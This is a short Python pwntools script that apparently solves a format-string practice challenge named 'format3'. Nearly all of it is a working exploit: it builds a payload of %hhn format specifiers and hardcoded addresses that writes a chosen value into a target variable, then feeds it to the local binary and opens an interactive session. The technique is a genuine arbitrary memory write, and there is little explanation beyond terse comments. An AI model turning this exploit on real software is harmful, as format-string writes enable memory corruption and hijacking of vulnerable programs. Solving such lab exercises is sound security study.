from pwn import *
import sys
context.clear(arch="i386")
#we wanna make target = 0x01025544
# we can do this with (%hhn)
#1%hhn1%hhn111111111111111111111111111111111111111111111111111111111111111111%hhn11111111111111111%hhn, (char *)&target+3,(char *)&target+2,(char *)&target,(char *)&target+1

#target addr byte 0  0x5655700c
#target addr byte 1  0x5655700d
#target addr byte 2  0x5655700e
#target addr byte 3  0x5655700f
spot = " %44$x"
exploit_str = 'a'*1 + "%46$hhn" + 'b'*1 +"%47$hhn" + 'c'*66 + "%44$hhn" + 'd'*17 + "%45$hhn" + 'e'*3 +p32(0x5655700c) + p32(0x5655700d) + p32(0x5655700f) + p32(0x5655700e) + spot
#exploit_str = "1%hhn1%hhn111111111111111111111111111111111111111111111111111111111111111111%hhn11111111111111111%hhn%x, (char *)&target+3,(char *)&target+2,(char *)&target,(char *)&target+1,target"
p = process(["./format3"])
p.sendline(exploit_str)
p.interactive()
#sys.stdout.write(exploit_str)
